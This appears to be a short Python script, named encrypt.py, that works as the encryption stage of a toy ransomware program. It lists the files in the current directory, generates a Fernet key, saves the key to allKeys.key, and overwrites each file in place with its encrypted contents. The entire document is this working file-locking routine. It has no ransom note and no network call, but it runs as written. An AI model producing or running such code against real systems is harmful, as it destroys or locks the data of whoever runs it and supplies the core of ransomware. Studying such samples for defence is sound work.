import os
from cryptography.fernet import Fernet

# *Find files in the current directory

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == ".gitignore" or file == "key.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

#* Library to encrypt files with random key

key = Fernet.generate_key()

#* Creating a file to save the generated password

with open("allKeys.key", "wb") as allKeys: 
    allKeys.write(key)

#! Encrypt file content
for file in files: 
    with open(file, "rb") as readFile: 
        contents = readFile.read()
        contents_encryted = Fernet(key).encrypt(contents)
    with open(file, "wb") as writeFile: 
        writeFile.write(contents_encryted)
    